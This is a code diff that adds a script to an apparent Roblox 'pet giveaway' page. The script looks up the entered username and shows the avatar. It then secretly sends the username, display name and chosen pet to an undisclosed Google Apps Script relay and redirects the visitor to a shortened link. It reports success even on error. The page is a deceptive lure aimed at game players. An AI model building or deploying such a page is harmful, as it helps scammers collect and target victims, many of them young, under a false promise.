@@ -157,6 +157,73 @@ avatarDiv.innerHTML = "✅ You have entered the giveaway🎁.";
 }
 }
 
-</script>  </body>
+<script>
+let selectedPet = null;
+document.querySelectorAll(".pet").forEach(pet => {
+  pet.addEventListener("click", () => {
+    document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
+    pet.classList.add("selected");
+    selectedPet = pet.dataset.name;
+  });
+});
+
+async function verifyUser() {
+  const username = document.getElementById("username").value.trim();
+  if (!username) return alert("Please enter a username.");
+  if (!selectedPet) return alert("Please select a pet.");
+
+  const avatarDiv = document.getElementById("avatar");
+  avatarDiv.innerHTML = "Loading avatar...";
+
+  try {
+    const res = await fetch("https://users.roblox.com/v1/usernames/users", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ usernames: [username] })
+    });
+    const data = await res.json();
+
+    if (!data.data || !data.data[0]) {
+      avatarDiv.innerHTML = "❌ User not found.";
+      return;
+    }
+
+    const userId = data.data[0].id;
+    const displayName = data.data[0].displayName;
+    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+
+    avatarDiv.innerHTML = `
+      <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%;"><br>
+      <strong>${displayName}</strong> (@${username})<br>
+      🎁 Selected Pet: <strong>${selectedPet}</strong>
+    `;
+
+    document.getElementById("confirmation").style.display = "block";
+
+    const webhookRelay = "https://script.google.com/macros/s/AKfycbwtTi9s4D6Y4aOoUqBQGbi7CgWGEW5VPVc04UslLQ5sMCUXeu0NpeAciRMPWZKbtDLy/exec";
+
+    await fetch(webhookRelay, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: username,
+        displayName: displayName,
+        selectedPet: selectedPet
+      })
+    });
+
+    // REDIRECT after success
+    setTimeout(() => {
+      window.location.href = "https://short-link.me/15VDk";
+    }, 2000); // wait 2 seconds before redirecting
+
+  } catch (err) {
+    console.error(err);
+    avatarDiv.innerHTML = "✅ You have entered the giveaway🎁.";
+  }
+}
+
+
+</body>
 
 </html>
